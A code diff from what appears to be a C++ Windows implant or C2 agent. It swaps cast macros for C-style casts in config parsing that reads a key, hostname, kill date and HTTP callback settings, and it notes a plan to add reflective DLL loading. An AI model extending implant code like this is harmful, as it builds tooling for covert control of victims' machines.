@@ -142,7 +142,7 @@ namespace Implant {
         Parser::ParserMemcpy(&parser, &Ctx->config.key, nullptr);
         Parser::ParserStrcpy(&parser, &Ctx->config.hostname, nullptr);
 
-        //Xtea::XteaCrypt(S_CAST(PBYTE, Parser.Buffer), Parser.Length - 0x12, Ctx->config.Key, FALSE);
+        //Xtea::XteaCrypt(B_PTR(Parser.Buffer), Parser.Length - 0x12, Ctx->config.Key, FALSE);
         // todo: add ReflectLoadLibrary: https://github.com/bats3c/DarkLoadLibrary
 
         if ((F_PTR_HMOD(Ctx->win32.LoadLibraryA, Ctx->modules.kernel32, LOADLIBRARYA))) {
@@ -254,7 +254,7 @@ namespace Implant {
         Ctx->config.killdate    = Parser::UnpackDword64(&parser);
 
 #ifdef TRANSPORT_HTTP
-        Ctx->transport.http = S_CAST(_http_context*, x_malloc(sizeof(_http_context)));
+        Ctx->transport.http = (_http_context*) x_malloc(sizeof(_http_context));
 
         Ctx->transport.http->handle     = nullptr;
         Ctx->transport.http->endpoints  = nullptr;
@@ -262,10 +262,10 @@ namespace Implant {
 
         Parser::ParserWcscpy(&parser, &Ctx->transport.http->useragent, nullptr);
         Parser::ParserWcscpy(&parser, &Ctx->transport.http->address, nullptr  );
-        Ctx->transport.http->port = S_CAST(int, Parser::UnpackDword(&parser));
+        Ctx->transport.http->port = (int) Parser::UnpackDword(&parser);
 
         Ctx->transport.http->n_endpoints = Parser::UnpackDword(&parser);
-        Ctx->transport.http->endpoints  = S_CAST(wchar_t**, x_malloc(sizeof(wchar_t*) * ((Ctx->transport.http->n_endpoints + 1))));
+        Ctx->transport.http->endpoints  = (wchar_t**) x_malloc(sizeof(wchar_t*) * ((Ctx->transport.http->n_endpoints + 1)));
 
         for (auto i = 0; i < Ctx->transport.http->n_endpoints; i++) {
             Parser::ParserWcscpy(&parser, &Ctx->transport.http->endpoints[i], nullptr);
@@ -277,7 +277,7 @@ namespace Implant {
         Ctx->transport.b_proxy = Parser::UnpackBool(&parser);
 
         if (Ctx->transport.b_proxy) {
-            Ctx->transport.http->proxy = R_CAST(_proxy*, x_malloc(sizeof(_proxy)));
+            Ctx->transport.http->proxy = (_proxy*) x_malloc(sizeof(_proxy));
             Ctx->transport.http->access = INTERNET_OPEN_TYPE_PROXY;
 
             Parser::ParserWcscpy(&parser, &Ctx->transport.http->proxy->address, nullptr );
